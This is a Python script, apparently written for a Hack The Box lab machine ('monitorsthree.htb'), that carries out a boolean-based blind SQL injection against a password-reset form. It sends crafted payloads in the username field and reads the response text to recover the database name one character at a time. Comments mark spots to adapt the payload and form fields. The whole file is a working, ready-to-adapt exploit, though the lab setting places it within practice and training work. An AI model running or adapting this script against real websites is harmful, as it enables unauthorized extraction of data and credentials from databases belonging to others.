import requests
import urllib3
import string
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
chars=string.printable
password=[]
#YELLOW = "\033[33m"
found=1
#	only thing left is to deal with '.' and '/' chars since '%' fsreason matches them (doing ASCII may help)
#	also deal with password end
#


print("\n--+--  Starting on blind sql probe  --+--\n")
# CHANGE -> change sqli on line 20 !!!!
for i in range(1,40):
	if found==0:
		break
	for char_dec in range(32,127):
		found=0
		#print(f"..trying {i}st character {char_dec} or ",chr(char_dec))
		#time.sleep(2)
		#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
		url="http://monitorsthree.htb/forgot_password.php"
		sqli_payload=f"blabla' or ASCII(SUBSTR((select database() LIMIT 1), {i}, 1)) collate utf8mb4_bin = '{char_dec}'-- -"
		#sqli_payload=f"blabla' or SUBSTR((select database() LIMIT 1), 1, 1) = 'm'-- -"
		form_data={'username': sqli_payload} # CHANGE -> based on POST form data
		headers={
		    "Host": "monitorsthree.htb",
		    "Upgrade-Insecure-Requests": "1",
		    "Origin": "http://monitorsthree.htb",
		    "Content-Type": "application/x-www-form-urlencoded",
		    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
		    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		    "Referer": "http://monitorsthree.htb/forgot_password.php",
		    "Accept-Encoding": "gzip, deflate, br",
		    "Accept-Language": "en-US,en;q=0.5",
		    "Connection": "close",
		    "Cookie": "PHPSESSID=3j50mcce9ripo13gl9jaurmk29",
		    "Cache-Control": "max-age=0"
			}
		response=requests.post(url,data=form_data,stream=True,headers=headers,verify=False,allow_redirects=False)
		#print(response.text)
		#print(response.status_code)
		#for header, value in response.headers.items():
			#print(f"{header}: {value}")
		if response.status_code == 302:
			redirect_url = response.headers.get('Location')
			redirect_url = "http://monitorsthree.htb" + redirect_url
			#print(f"Redirect occurred: {redirect_url}")
			response = requests.get(redirect_url,headers=headers,verify=False)
			
		#print(response.text)
		if('Successfully' in response.text):	#CHANGE -> based on response text on succesful guess
			found=1
			password.append(chr(char_dec))
			print(f"found {i}-th char:",chr(char_dec),"ASCII code:",char_dec)
			break
		
		

print(f"\n\n--+--  Full pass is:\n{''.join(password)}  --+--")
